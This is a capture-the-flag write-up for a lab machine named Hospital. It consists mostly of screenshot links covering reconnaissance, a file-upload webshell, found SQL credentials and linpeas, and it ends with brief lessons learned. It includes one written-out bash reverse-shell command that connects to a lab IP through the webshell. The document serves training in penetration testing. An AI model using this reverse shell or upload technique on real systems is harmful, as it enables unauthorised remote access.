Threader3000 scan:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/c3e2ac2b-ba94-435d-b84a-09a56cdca187)

nmap scan:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/3baeac0c-cf59-4c2d-8466-80f3c8116bb8)
![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/3a1f4b64-bf11-4b7b-a1bb-c9a893ae365e)

hospital.htb is the domain:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/39001823-a25b-469f-aceb-f864c4d06b12)

Seems like rpcclient/smb/ldap does not connect:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/5abd85ad-9fb4-4dc2-a281-ba4ce63e4d38)

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/7b8e0057-441b-4cc3-86cf-3887100f2221)

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/f9d5f3f3-98ee-4d01-8d22-473b786fbc51)

After visiting the webpage on port 8080, we see an interesting upload feature:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/4fb6996f-1a05-4536-a903-3ede84518add)

Seems to have went through:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/69bd009f-2640-414f-b728-d909365c1504)

dirsearch results:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/c519489f-f328-4bdc-a5cd-3b4b7cf3f1f4)

We seem to have no permission, but accessing the file directly works:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/026f37be-ba5c-459e-925c-6c65d76ad09d)

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/708a50e2-2fdc-4beb-9d77-88f53334f4f2)

Seems like we are on another machine, since Hospital should be a Windows box but this one is Linux:

Found some sql creds:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/95507aee-e924-4b9a-b5b5-bbd1560c88a0)

Stabilizing:

Running ``` bash -c "bash -i >& /dev/tcp/10.10.14.194/1234 0>&1" ``` in the webshell

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/4a3944db-e489-4a19-b981-a9773124c251)

Running linpeas:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/65067cd0-e53d-48ed-a585-2c255c481891)




## What I Learned
Folder perms != file perms, even if you can't access the directory, you may be able to access a file in the directory
.phar extension
